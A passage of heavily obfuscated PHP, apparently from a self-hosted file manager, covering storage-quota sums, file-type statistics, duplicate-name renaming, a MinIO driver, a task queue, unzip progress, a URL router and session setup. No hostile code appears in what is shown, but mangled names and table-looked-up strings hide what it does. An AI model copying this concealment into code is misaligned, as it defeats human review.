$‹ÏÍÈñÍ[$±’˜»î][$Û¡ÏÌ¿…[435]]) { $‹ÏÍÈñÍ[$±’˜»î][$Û¡ÏÌ¿…[88]] += $³é”ëÁê[$Û¡ÏÌ¿…[88]]; } } foreach ($‹ÏÍÈñÍ as $³é”ëÁê) { $öêÍĞ = $this->parentLevelArray($³é”ëÁê[$Û¡ÏÌ¿…[525]]); foreach ($öêÍĞ as $±’˜»î) { $±’˜»î = $±’˜»î . $Û¡ÏÌ¿…[33]; if (!isset($‹ÏÍÈñÍ[$±’˜»î])) { continue; } if ($³é”ëÁê[$Û¡ÏÌ¿…[435]] == $‹ÏÍÈñÍ[$±’˜»î][$Û¡ÏÌ¿…[435]]) { $‹ÏÍÈñÍ[$±’˜»î][$Û¡ÏÌ¿…[88]] += $³é”ëÁê[$Û¡ÏÌ¿…[88]]; } } } $Ù’¯öĞ³ = array(); foreach ($‹ÏÍÈñÍ as $³é”ëÁê) { if ($³é”ëÁê[$Û¡ÏÌ¿…[88]] == $³é”ëÁê[$Û¡ÏÌ¿…[2037]]) { continue; } $Ù’¯öĞ³[] = array($Û¡ÏÌ¿…[407], $³é”ëÁê[$Û¡ÏÌ¿…[407]], $Û¡ÏÌ¿…[88], $³é”ëÁê[$Û¡ÏÌ¿…[88]]); } $this->saveAll($Ù’¯öĞ³); } public function userSpaceReset($¨ğö÷„Õ = false) { $•íã•îî =& $_SERVER[Á÷ ­Šë]; $é‹êø¨ˆ = $this->where(array($•íã•îî[416] => self::TYPE_USER, $•íã•îî[508] => $¨ğö÷„Õ, $•íã•îî[415] => 0))->sum($•íã•îî[88]); $é‹êø¨ˆ = !$é‹êø¨ˆ || $é‹êø¨ˆ <= 0 ? 0 : $é‹êø¨ˆ; Model($•íã•îî[517])->userEdit($¨ğö÷„Õ, array($•íã•îî[1730] => $é‹êø¨ˆ)); } public function targetSpaceUpdate($íûÏñ, $„¥½ÁùË) { $ËŸëº‚£ =& $_SERVER[Á÷ ­Šë]; if (!$„¥½ÁùË) { return; } if (!in_array($íûÏñ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $óˆöÃÁ› = $this->targetSpaceSize($íûÏñ, $„¥½ÁùË); if ($íûÏñ == self::TYPE_USER) { Model($ËŸëº‚£[517])->userEdit($„¥½ÁùË, array($ËŸëº‚£[1730] => $óˆöÃÁ›)); } else { if ($íûÏñ == self::TYPE_GROUP) { Model($ËŸëº‚£[526])->groupEdit($„¥½ÁùË, array($ËŸëº‚£[1730] => $óˆöÃÁ›)); } } } public function targetSpaceSize($ —ÅÏÜÀ, $ª›™ºšÏ) { $¬²•ÏÙÙ =& $_SERVER[Á÷ ­Šë]; $ÅàãÎÂ = $this->sourceRoot($ —ÅÏÜÀ, $ª›™ºšÏ, !0); if (!$ÅàãÎÂ) { return 0; } $îÖ›Ÿ×¦ = floatval($ÅàãÎÂ[$¬²•ÏÙÙ[88]]); $ŸĞ½»ØŸ = array($¬²•ÏÙÙ[588] => array($¬²•ÏÙÙ[548], $¬²•ÏÙÙ[535] . $ÅàãÎÂ[$¬²•ÏÙÙ[407]] . $¬²•ÏÙÙ[549])); $øÈñ = Model($¬²•ÏÙÙ[433])->field($¬²•ÏÙÙ[422])->where($ŸĞ½»ØŸ)->select(); $øÈñ = array_to_keyvalue($øÈñ, $¬²•ÏÙÙ[33], $¬²•ÏÙÙ[407]); $øÈñ = array_unique(array_filter($øÈñ)); if ($øÈñ) { $ŸĞ½»ØŸ = array($¬²•ÏÙÙ[422] => array($¬²•ÏÙÙ[423], $øÈñ)); $îÖ›Ÿ×¦ += floatval($this->where($ŸĞ½»ØŸ)->sum($¬²•ÏÙÙ[88])); } $îÖ›Ÿ×¦ = !$îÖ›Ÿ×¦ || $îÖ›Ÿ×¦ <= 0 ? 0 : $îÖ›Ÿ×¦; return $îÖ›Ÿ×¦; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($´€Û·ä‹) { return $this->fileTypeProfile($´€Û·ä‹, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ã¯„ƒÛå) { return $this->fileTypeProfile($Ã¯„ƒÛå, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¯ûŞ«ùÀ, $ìÒ„¹­) { $€ğÕ­¯œ =& $_SERVER[Á÷ ­Šë]; $ûÊ‡Š¢› = $€ğÕ­¯œ[2038] . $¯ûŞ«ùÀ . $€ğÕ­¯œ[81] . $ìÒ„¹­; $¥ß—ô‹‹ = Cache::get($ûÊ‡Š¢›); if ($¥ß—ô‹‹) { return $¥ß—ô‹‹; } $Æ‡Óºš = array($€ğÕ­¯œ[581] => 0); if ($¯ûŞ«ùÀ != !1) { $Æ‡Óºš[$€ğÕ­¯œ[508]] = $¯ûŞ«ùÀ; $Æ‡Óºš[$€ğÕ­¯œ[416]] = $ìÒ„¹­; } $¨ÓÙ›°è = array(); $¨ÓÙ›°è[$€ğÕ­¯œ[2039]] = array($€ğÕ­¯œ[2040] => LNG($€ğÕ­¯œ[2039]), $€ğÕ­¯œ[2041] => $this->where($Æ‡Óºš)->count(), $€ğÕ­¯œ[583] => $this->where($Æ‡Óºš)->sum($€ğÕ­¯œ[88])); $ÚŸ”ô×Ä = KodIO::fileTypeList(); foreach ($ÚŸ”ô×Ä as $÷ãôÈê => $‰ïÌ­ß) { $Æ‡Óºš[$€ğÕ­¯œ[417]] = $this->fileTypeWhere($÷ãôÈê); $¨ÓÙ›°è[$÷ãôÈê] = array($€ğÕ­¯œ[2040] => $‰ïÌ­ß[$€ğÕ­¯œ[28]], $€ğÕ­¯œ[2041] => $this->where($Æ‡Óºš)->count(), $€ğÕ­¯œ[583] => $this->where($Æ‡Óºš)->sum($€ğÕ­¯œ[88])); } Cache::set($ûÊ‡Š¢›, $¨ÓÙ›°è, 1200); return $¨ÓÙ›°è; } public function fileNameExist($–ùĞØ¥í, $±Ëˆ’À•) { $ŒÉ¹â…Ñ =& $_SERVER[Á÷ ­Šë]; $Ú²ŸÄ®À = $this->where(array($ŒÉ¹â…Ñ[502] => $–ùĞØ¥í, $ŒÉ¹â…Ñ[28] => $±Ëˆ’À•, $ŒÉ¹â…Ñ[435] => 0))->find(); return is_array($Ú²ŸÄ®À) ? $Ú²ŸÄ®À[$ŒÉ¹â…Ñ[407]] : !1; } public function childList($“ÖøÏ¸) { $¾ÃÄÎ¬µ =& $_SERVER[Á÷ ­Šë]; $¯ˆîÎ¤æ = $¾ÃÄÎ¬µ[2016] . $“ÖøÏ¸; if (isset(self::$cacheChildList[$¯ˆîÎ¤æ])) { return self::$cacheChildList[$¯ˆîÎ¤æ]; } $åˆˆÉÊ¬ = array($¾ÃÄÎ¬µ[502] => intval($“ÖøÏ¸), $¾ÃÄÎ¬µ[435] => 0); $ó¶µÍõ™ = $this->where($åˆˆÉÊ¬)->select(); $ó¶µÍõ™ = $ó¶µÍõ™ ? $ó¶µÍõ™ : array(); self::$cacheChildList[$¯ˆîÎ¤æ] = $ó¶µÍõ™; foreach ($ó¶µÍõ™ as $úÆªğ) { $¯ˆîÎ¤æ = $¾ÃÄÎ¬µ[462] . $úÆªğ[$¾ÃÄÎ¬µ[407]]; self::$cacheSourceInfo[$¯ˆîÎ¤æ] = $úÆªğ; } return $ó¶µÍõ™; } public function fileNameAuto($˜­üöÄú, $™Æ›Ûæƒ, $°¸ÒåÍˆ = REPEAT_RENAME, $–æàèì = false) { $²ŒÄ ÆÙ =& $_SERVER[Á÷ ­Šë]; $™‰ãêİ = array($²ŒÄ ÆÙ[502] => $˜­üöÄú, $²ŒÄ ÆÙ[435] => 0, $²ŒÄ ÆÙ[28] => array($²ŒÄ ÆÙ[390], $™Æ›Ûæƒ . $²ŒÄ ÆÙ[391])); $Ö±‹É´î = $this->field($²ŒÄ ÆÙ[28])->where($™‰ãêİ)->select(); $òòæ– = array_to_keyvalue($Ö±‹É´î, $²ŒÄ ÆÙ[33], $²ŒÄ ÆÙ[28]); return $this->fileNameAutoGet($òòæ–, $™Æ›Ûæƒ, $°¸ÒåÍˆ, $–æàèì); } public function fileNameAutoGet($€£ÀÃ¹ , $òŠ¸Ğ¼Í, $•´®’², $¦º††ğ) { $ÀÇ›œ‹à =& $_SERVER[Á÷ ­Šë]; if ($•´®’² == REPEAT_REPLACE || !$€£ÀÃ¹  || !in_array_not_case($òŠ¸Ğ¼Í, $€£ÀÃ¹ ) || $¦º††ğ && $•´®’² != REPEAT_RENAME_FOLDER) { return $òŠ¸Ğ¼Í; } if ($•´®’² == REPEAT_SKIP) { return !1; } $Ğµ¼üæâ = $ÀÇ›œ‹à[105] . get_path_ext($òŠ¸Ğ¼Í); $Ğµ¼üæâ = $Ğµ¼üæâ == $ÀÇ›œ‹à[105] || $¦º††ğ ? $ÀÇ›œ‹à[33] : $Ğµ¼üæâ; for ($òÏ÷ÆâÅ = 1; $òÏ÷ÆâÅ <= count($€£ÀÃ¹ ) + 1; $òÏ÷ÆâÅ++) { $ìøäÌÛÎ = substr($òŠ¸Ğ¼Í, 0, strlen($òŠ¸Ğ¼Í) - strlen($Ğµ¼üæâ)); $—æ–¬¦• = $ìøäÌÛÎ . "\x28{$òÏ÷ÆâÅ}\x29{$Ğµ¼üæâ}"; if (!in_array_not_case($—æ–¬¦•, $€£ÀÃ¹ )) { return $—æ–¬¦•; } } } } goto Bµé™ğÔ¥—; bŒˆ¬Ò™Â: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($”…«œ¢ù) { parent::__construct($”…«œ¢ù); $this->signatureVersion($_SERVER[Á÷ ­Šë][222]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } define($_SERVER[Á÷ ­Šë][245], 1); define($_SERVER[Á÷ ­Šë][246], 2); goto Bã‰Û„á˜¼; D»÷Íƒ£‹: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\x6b\x51\x75\x65\165\x65\114\x65\156\147\164\x68"; const QUEUE_DATA = "\164\141\163\153\121\x75\x65\x75\145\104\141\x74\141"; public static $listData = false; public static function initTask() { } public static function add($şÌ¤È±€, $£Ã´Ô¸Ä = array(), $¡ñ®¯İƒ = '', $‚Á®”ßƒ = '') { $«ÜÛ©£… =& $_SERVER[Á÷ ­Šë]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($‚Á®”ßƒ && array_find_by_field(self::$listData, $«ÜÛ©£…[103], $‚Á®”ßƒ)) { return !0; } self::$listData[] = array($«ÜÛ©£…[271] => $şÌ¤È±€, $«ÜÛ©£…[1650] => $£Ã´Ô¸Ä, $«ÜÛ©£…[455] => $¡ñ®¯İƒ, $«ÜÛ©£…[103] => $‚Á®”ßƒ); return !0; } public static function addSubmit() { $Ø­Ï¸ßÁ =& $_SERVER[Á÷ ­Šë]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Ø­Ï¸ßÁ[1651] . json_encode_force(array_to_keyvalue(self::$listData, $Ø­Ï¸ßÁ[33], $Ø­Ï¸ßÁ[455])), $Ø­Ï¸ßÁ[1652]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($ı¯ª»âÎ, $…ãû¿õ = array(), $ÈÏÜÕÊ = '', $ùàÎ—‹© = '') { $‡£ß¦İŞ =& $_SERVER[Á÷ ­Šë]; if (self::count() >= self::MAX_LENGTH) { return !1; } $œõíÓÒ = self::getAll(); if ($ùàÎ—‹© && array_find_by_field($œõíÓÒ, $‡£ß¦İŞ[103], $ùàÎ—‹©)) { return !0; } $œõíÓÒ[] = array($‡£ß¦İŞ[271] => $ı¯ª»âÎ, $‡£ß¦İŞ[1650] => $…ãû¿õ, $‡£ß¦İŞ[455] => $ÈÏÜÕÊ, $‡£ß¦İŞ[103] => $ùàÎ—‹©); write_log($‡£ß¦İŞ[1651] . $ÈÏÜÕÊ, $‡£ß¦İŞ[1652]); self::setAll($œõíÓÒ); return !0; } public static function run() { $¼·ı‚ö¡ =& $_SERVER[Á÷ ­Šë]; $ş¾Ğ¹˜ç = self::getAll(); $®—ª“ = array_shift($ş¾Ğ¹˜ç); if (!$®—ª“) { return !1; } self::setAll($ş¾Ğ¹˜ç); $ÇÔÏè²ƒ = timeFloat(); try { Hook::apply($®—ª“[$¼·ı‚ö¡[271]], $®—ª“[$¼·ı‚ö¡[1650]]); } catch (Exception $Šûƒ›Ù) { } $ï¦ÖÅ¾ä = number_format(timeFloat() - $ÇÔÏè²ƒ, 3) . $¼·ı‚ö¡[1588]; write_log($¼·ı‚ö¡[1653] . $®—ª“[$¼·ı‚ö¡[455]] . $¼·ı‚ö¡[1654] . $ï¦ÖÅ¾ä, $¼·ı‚ö¡[1652]); return !0; } public static function count() { $Éå¤œÙì = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Éå¤œÙì) { return 0; } return intval($Éå¤œÙì); } public static function getAll() { $Úêù÷ßÄ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Úêù÷ßÄ) { return array(); } return $Úêù÷ßÄ; } public static function setAll($ˆ´Äı…) { $Öªë¢£Í = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ˆ´Äı…), $Öªë¢£Í); Cache::set(self::QUEUE_DATA, $ˆ´Äı…, $Öªë¢£Í); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ƒ¢øïò÷, $÷ëîó¹€ = 5.0) { if (!$ƒ¢øïò÷) { return; } $ıìƒ¿ê˜ = Cache::get($ƒ¢øïò÷); if (!$ıìƒ¿ê˜ || timeFloat() - floatVal($ıìƒ¿ê˜) >= $÷ëîó¹€) { Cache::set($ƒ¢øïò÷, timeFloat(), $÷ëîó¹€ * 10); return !0; } return !1; } public static function timeLimitCall($İĞ’˜•, $‘·ıĞº‡, $ëä•œ¤á, $ß¶“„© = 5.0) { $ï“¡œ¢¸ =& $_SERVER[Á÷ ­Šë]; if (!$İĞ’˜• || !$‘·ıĞº‡) { return; } self::$asyncAdd = !0; $³İúˆ„à = $ï“¡œ¢¸[1655]; $ÖÖ´ÔÁë = Cache::get($³İúˆ„à, !0); $ñğÂøôÂ = array($ï“¡œ¢¸[1656] => timeFloat(), $ï“¡œ¢¸[1657] => timeFloat(), $ï“¡œ¢¸[271] => $‘·ıĞº‡, $ï“¡œ¢¸[1650] => $ëä•œ¤á, $ï“¡œ¢¸[207] => $ß¶“„©); if (is_array($ÖÖ´ÔÁë[$İĞ’˜•])) { $ñğÂøôÂ[$ï“¡œ¢¸[1657]] = $ÖÖ´ÔÁë[$İĞ’˜•][$ï“¡œ¢¸[1657]]; } if (is_array($ÖÖ´ÔÁë[$İĞ’˜•])) { if (timeFloat() - $ÖÖ´ÔÁë[$İĞ’˜•][$ï“¡œ¢¸[1656]] < $ñğÂøôÂ[$ï“¡œ¢¸[207]] * 0.3) { return; } $ñğÂøôÂ[$ï“¡œ¢¸[1657]] = $ÖÖ´ÔÁë[$İĞ’˜•][$ï“¡œ¢¸[1657]]; } $ÖÖ´ÔÁë[$İĞ’˜•] = $ñğÂøôÂ; Cache::set($³İúˆ„à, $ÖÖ´ÔÁë, 60); Cache::removeMemory($³İúˆ„à); write_log($ï“¡œ¢¸[1658] . $İĞ’˜• . $ï“¡œ¢¸[78] . $‘·ıĞº‡, $ï“¡œ¢¸[1652]); } public static function timeLimitCallLoop() { $•µãçÖŠ =& $_SERVER[Á÷ ­Šë]; $ÆäøÄşù = array($•µãçÖŠ[1659]); $Üı·ş¸ = in_array(strtolower(ACTION), $ÆäøÄşù); if (!$Üı·ş¸ && !self::$asyncAdd) { return; } $ö‘¦£ø = $•µãçÖŠ[1655]; $ØğÉèĞí = Cache::get($ö‘¦£ø, !0); if (!$ØğÉèĞí || count($ØğÉèĞí) <= 0) { return; } $Š€£» · = !1; $İ¾¾¾Š¥ = timeFloat(); $Ö‡ÎµÛç = array(); foreach ($ØğÉèĞí as $Ò™ü¨º‰ => $Áî÷ÌÃã) { if ($İ¾¾¾Š¥ - $Áî÷ÌÃã[$•µãçÖŠ[1657]] > $Áî÷ÌÃã[$•µãçÖŠ[207]]) { $Š€£» · = !0; try { Hook::apply($Áî÷ÌÃã[$•µãçÖŠ[271]], $Áî÷ÌÃã[$•µãçÖŠ[1650]]); write_log($•µãçÖŠ[1660] . $Ò™ü¨º‰ . $•µãçÖŠ[78] . $Áî÷ÌÃã[$•µãçÖŠ[271]] . $•µãçÖŠ[1661] . ACTION, $•µãçÖŠ[1652]); } catch (Exception $· ‘Ï‚) { } continue; } $Ö‡ÎµÛç[$Ò™ü¨º‰] = $Áî÷ÌÃã; } if (!$Š€£» ·) { return; } if (!$Ö‡ÎµÛç) { return Cache::remove($ö‘¦£ø); } Cache::set($ö‘¦£ø, $Ö‡ÎµÛç, 60); Cache::removeMemory($ö‘¦£ø); } public static function finished($‡Ñª²øÀ, $»È½ü÷) { $¯à‡Ø¬ó =& $_SERVER[Á÷ ­Šë]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¯à‡Ø¬ó[271] => $‡Ñª²øÀ, $¯à‡Ø¬ó[1650] => $»È½ü÷); } private static function finishedRun() { $ßƒÃ‰Ù³ =& $_SERVER[Á÷ ­Šë]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $©¥˜§•€) { try { Hook::apply($©¥˜§•€[$ßƒÃ‰Ù³[271]], $©¥˜§•€[$ßƒÃ‰Ù³[1650]]); } catch (Exception $äóàÈ÷Ø) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¿ó¹¡€ö =& $_SERVER[Á÷ ­Šë]; parent::startAfter(); Hook::bind($¿ó¹¡€ö[1662], array($this, $¿ó¹¡€ö[1663])); Hook::bind($¿ó¹¡€ö[1120], array($this, $¿ó¹¡€ö[1664])); $ÊµûÎ­õ =& $this->task; $ÊµûÎ­õ[$¿ó¹¡€ö[1665]] = $¿ó¹¡€ö[1125]; if (!$ÊµûÎ­õ[$¿ó¹¡€ö[1474]]) { $ÊµûÎ­õ[$¿ó¹¡€ö[1474]] = LNG($¿ó¹¡€ö[1666]); } } protected function endAfter() { $ §İÄüÛ =& $_SERVER[Á÷ ­Šë]; parent::endAfter(); Hook::unbind($ §İÄüÛ[1662], array($this, $ §İÄüÛ[1663])); Hook::unbind($ §İÄüÛ[1120], array($this, $ §İÄüÛ[1664])); } public function updateAfter() { $´­–İ° =& $_SERVER[Á÷ ­Šë]; $‰õŞ÷È =& $this->task; if (!$‰õŞ÷È[$´­–İ°[1055]] || !$‰õŞ÷È[$´­–İ°[758]]) { return; } if ($‰õŞ÷È[$´­–İ°[1665]] == $´­–İ°[1125]) { $û–ØÖ˜“ = 0; if ($‰õŞ÷È[$´­–İ°[1621]]) { $û–ØÖ˜“ = $‰õŞ÷È[$´­–İ°[1622]] / $‰õŞ÷È[$´­–İ°[1621]]; } $‰õŞ÷È[$´­–İ°[1576]] = $û–ØÖ˜“ * 0.3; } else { if ($‰õŞ÷È[$´­–İ°[1665]] == $´­–İ°[320]) { $û–ØÖ˜“ = $‰õŞ÷È[$´­–İ°[1575]] / $‰õŞ÷È[$´­–İ°[1055]]; $‰õŞ÷È[$´­–İ°[1576]] = 0.3 + $û–ØÖ˜“ * 0.4; } else { if ($‰õŞ÷È[$´­–İ°[1665]] == $´­–İ°[117]) { $²µ©‚ˆÜ = 0; if ($‰õŞ÷È[$´­–İ°[1623]] == $´­–İ°[117]) { $²µ©‚ˆÜ = $‰õŞ÷È[$´­–İ°[1622]]; } $û–ØÖ˜“ = ($‰õŞ÷È[$´­–İ°[1626]] + $²µ©‚ˆÜ) / $‰õŞ÷È[$´­–İ°[758]]; $‰õŞ÷È[$´­–İ°[1576]] = 0.3 + 0.4 + $û–ØÖ˜“ * 0.3; } } } if ($‰õŞ÷È[$´­–İ°[1576]] > 0) { $Ëİú«Ñè = timeFloat() - $‰õŞ÷È[$´­–İ°[784]] - $‰õŞ÷È[$´­–İ°[1579]]; $‰õŞ÷È[$´­–İ°[1580]] = $Ëİú«Ñè * (1 - $‰õŞ÷È[$´­–İ°[1576]]) / $‰õŞ÷È[$´­–İ°[1576]]; } } public function addFile($ôñù±îü) { $¿«ëÅ£ =& $_SERVER[Á÷ ­Šë]; $‹ÛÄŸñ§ =& $this->task; $§¬ôé– = IO::info($ôñù±îü); $‹ÛÄŸñ§[$¿«ëÅ£[1619]] = $§¬ôé–[$¿«ëÅ£[28]]; $‹ÛÄŸñ§[$¿«ëÅ£[1621]] = $§¬ôé–[$¿«ëÅ£[88]]; $‹ÛÄŸñ§[$¿«ëÅ£[1622]] = 0; $‹ÛÄŸñ§[$¿«ëÅ£[1057]] = $¿«ëÅ£[1641]; $‹ÛÄŸñ§[$¿«ëÅ£[1623]] = $¿«ëÅ£[1125]; $‹ÛÄŸñ§[$¿«ëÅ£[758]] = $§¬ôé–[$¿«ëÅ£[88]]; $‹ÛÄŸñ§[$¿«ëÅ£[1055]] = 1; $‘·Ğ ¯Š = 0; $‹ÛÄŸñ§[$¿«ëÅ£[1630]] = array($¿«ëÅ£[1631] => $‘·Ğ ¯Š + 1, $¿«ëÅ£[425] => $§¬ôé–[$¿«ëÅ£[28]], $¿«ëÅ£[86] => $§¬ôé–[$¿«ëÅ£[86]], $¿«ëÅ£[523] => $§¬ôé–[$¿«ëÅ£[523]] ? $§¬ôé–[$¿«ëÅ£[523]] : $§¬ôé–[$¿«ëÅ£[86]]); $this->update(); } public function unzipAfter($§îÉ»µø) { $ô‚Ò¯¬— =& $_SERVER[Á÷ ­Šë]; $ëÓ‘¤şº =& $this->task; $ëÓ‘¤şº[$ô‚Ò¯¬—[1665]] = $ô‚Ò¯¬—[117]; $”Ù¢Öá˜ = IO::infoWithChildren($§îÉ»µø); $ÎçØÇÌ = 0; $ëÓ‘¤şº[$ô‚Ò¯¬—[1630]] = array($ô‚Ò¯¬—[1631] => $ÎçØÇÌ + 1, $ô‚Ò¯¬—[425] => $”Ù¢Öá˜[$ô‚Ò¯¬—[28]], $ô‚Ò¯¬—[86] => $”Ù¢Öá˜[$ô‚Ò¯¬—[86]], $ô‚Ò¯¬—[523] => $”Ù¢Öá˜[$ô‚Ò¯¬—[523]] ? $”Ù¢Öá˜[$ô‚Ò¯¬—[523]] : $”Ù¢Öá˜[$ô‚Ò¯¬—[86]]); if ($”Ù¢Öá˜[$ô‚Ò¯¬—[29]] == $ô‚Ò¯¬—[203]) { $ëÓ‘¤şº[$ô‚Ò¯¬—[1055]] = 1; } else { $ëÓ‘¤şº[$ô‚Ò¯¬—[1055]] = $”Ù¢Öá˜[$ô‚Ò¯¬—[91]][$ô‚Ò¯¬—[89]]; } $ëÓ‘¤şº[$ô‚Ò¯¬—[1057]] = $ô‚Ò¯¬—[33]; $ëÓ‘¤şº[$ô‚Ò¯¬—[1623]] = 0; $ëÓ‘¤şº[$ô‚Ò¯¬—[1575]] = 0; $ëÓ‘¤şº[$ô‚Ò¯¬—[1621]] = 0; $ëÓ‘¤şº[$ô‚Ò¯¬—[1622]] = 0; $ëÓ‘¤şº[$ô‚Ò¯¬—[1619]] = $ô‚Ò¯¬—[33]; $ëÓ‘¤şº[$ô‚Ò¯¬—[1626]] = 0; $ëÓ‘¤şº[$ô‚Ò¯¬—[758]] = $”Ù¢Öá˜[$ô‚Ò¯¬—[88]]; $this->update(); self::log($ô‚Ò¯¬—[1667] . json_encode(array($ëÓ‘¤şº, $”Ù¢Öá˜))); } public function nameParse($Íµµ™ó) { $¸æ…ÙÁğ =& $_SERVER[Á÷ ­Šë]; $ÕÃŒî¾‡ =& $this->task; if ($ÕÃŒî¾‡[$¸æ…ÙÁğ[1665]] == $¸æ…ÙÁğ[1125]) { $ÕÃŒî¾‡[$¸æ…ÙÁğ[1665]] = $¸æ…ÙÁğ[320]; $ÕÃŒî¾‡[$¸æ…ÙÁğ[1626]] = 0; $ÕÃŒî¾‡[$¸æ…ÙÁğ[758]] = 0; } $¤Ì®êºã = get_path_this($Íµµ™ó); if (strstr($¤Ì®êºã, $¸æ…ÙÁğ[105])) { $ÕÃŒî¾‡[$¸æ…ÙÁğ[1575]] += 1; $ÕÃŒî¾‡[$¸æ…ÙÁğ[1055]] += 1; } $ÕÃŒî¾‡[$¸æ…ÙÁğ[1619]] = $Íµµ™ó; $this->update(); } } goto bÁƒöƒ‚; Cê²–Â±™°: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\136\x2f\135\53", "\72\x6e\165\155" => "\x5b\x30\55\x39\135\53", "\72\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Ô¡¢¿µ, $™èÛ¯ÑÅ) { $¿İ¯óç» =& $_SERVER[Á÷ ­Šë]; if ($Ô¡¢¿µ == $¿İ¯óç»[1519]) { $ÛûÌ˜´Í = array_map($¿İ¯óç»[1520], $™èÛ¯ÑÅ[0]); $‚…ü¸ùò = strpos($™èÛ¯ÑÅ[1], $¿İ¯óç»[8]) === 0 ? $™èÛ¯ÑÅ[1] : $¿İ¯óç»[8] . $™èÛ¯ÑÅ[1]; $Û¿†ˆşÑ = $™èÛ¯ÑÅ[2]; } else { $ÛûÌ˜´Í = null; $‚…ü¸ùò = strpos($™èÛ¯ÑÅ[0], $¿İ¯óç»[8]) === 0 ? $™èÛ¯ÑÅ[0] : $¿İ¯óç»[8] . $™èÛ¯ÑÅ[0]; $Û¿†ˆşÑ = $™èÛ¯ÑÅ[1]; } array_push(self::$maps, $ÛûÌ˜´Í); array_push(self::$routes, $‚…ü¸ùò); array_push(self::$methods, strtoupper($Ô¡¢¿µ)); array_push(self::$callbacks, $Û¿†ˆşÑ); } public static function error($Üˆ»˜»Ñ) { self::$errorCallback = $Üˆ»˜»Ñ; } public static function haltOnMatch($ä”µŸàË = true) { self::$halts = $ä”µŸàË; } public static function dispatch() { $—‰Í•Í„ =& $_SERVER[Á÷ ­Šë]; $ìîùèœü = parse_url($_SERVER[$—‰Í•Í„[1521]], PHP_URL_PATH); $­ªÇªèı = $_SERVER[$—‰Í•Í„[167]]; $Ÿ€Æ¸§‡ = array_keys(static::$patterns); $íãŠš = array_values(static::$patterns); $ÉÖ“¼×í = !1; self::$routes = preg_replace($—‰Í•Í„[1195], $—‰Í•Í„[8], self::$routes); if (in_array($ìîùèœü, self::$routes)) { $¬§¾‹Ÿ = array_keys(self::$routes, $ìîùèœü); foreach ($¬§¾‹Ÿ as $îÏƒŠ£·) { if (self::$methods[$îÏƒŠ£·] == $­ªÇªèı || self::$methods[$îÏƒŠ£·] == $—‰Í•Í„[1522] || in_array($­ªÇªèı, self::$maps[$îÏƒŠ£·])) { $ÉÖ“¼×í = !0; if (!is_object(self::$callbacks[$îÏƒŠ£·])) { $‡†‡ğú = explode($—‰Í•Í„[8], self::$callbacks[$îÏƒŠ£·]); $à¾®û» = end($‡†‡ğú); $“øøÉñá = explode($—‰Í•Í„[1523], $à¾®û»); $¼Î–¾¡Ó = new $“øøÉñá[0](); $¼Î–¾¡Ó->{$“øøÉñá[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$îÏƒŠ£·]); if (self::$halts) { return; } } } } } else { $äö‚òŞ§ = 0; foreach (self::$routes as $îÏƒŠ£·) { if (strpos($îÏƒŠ£·, $—‰Í•Í„[4]) !== !1) { $îÏƒŠ£· = str_replace($Ÿ€Æ¸§‡, $íãŠš, $îÏƒŠ£·); } if (preg_match($—‰Í•Í„[1524] . $îÏƒŠ£· . $—‰Í•Í„[1525], $ìîùèœü, $àÍ×Ò‡¸)) { if (self::$methods[$äö‚òŞ§] == $­ªÇªèı || self::$methods[$äö‚òŞ§] == $—‰Í•Í„[1522] || !empty(self::$maps[$äö‚òŞ§]) && in_array($­ªÇªèı, self::$maps[$äö‚òŞ§])) { $ÉÖ“¼×í = !0; array_shift($àÍ×Ò‡¸); if (!is_object(self::$callbacks[$äö‚òŞ§])) { $‡†‡ğú = explode($—‰Í•Í„[8], self::$callbacks[$äö‚òŞ§]); $à¾®û» = end($‡†‡ğú); $“øøÉñá = explode($—‰Í•Í„[1523], $à¾®û»); $¼Î–¾¡Ó = new $“øøÉñá[0](); if (!method_exists($¼Î–¾¡Ó, $“øøÉñá[1])) { echo $—‰Í•Í„[1526]; } else { call_user_func_array(array($¼Î–¾¡Ó, $“øøÉñá[1]), $àÍ×Ò‡¸); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$äö‚òŞ§], $àÍ×Ò‡¸); if (self::$halts) { return; } } } } $äö‚òŞ§++; } } if ($ÉÖ“¼×í == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ûŒÖçè =& $_SERVER[Á÷ ­Šë]; header($_SERVER[$ûŒÖçè[1527]] . $ûŒÖçè[1528]); echo $ûŒÖçè[1529]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$—‰Í•Í„[1521]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ş¥Ùê­ =& $_SERVER[Á÷ ­Šë]; static $¨ü·Äšº = false; if ($¨ü·Äšº) { return $¨ü·Äšº; } $“ˆæ‘Ç— = $GLOBALS[$Ş¥Ùê­[6]][$Ş¥Ùê­[356]]; self::$sessionTime = $“ˆæ‘Ç—[$Ş¥Ùê­[1530]]; $ì¸‹è¼† = 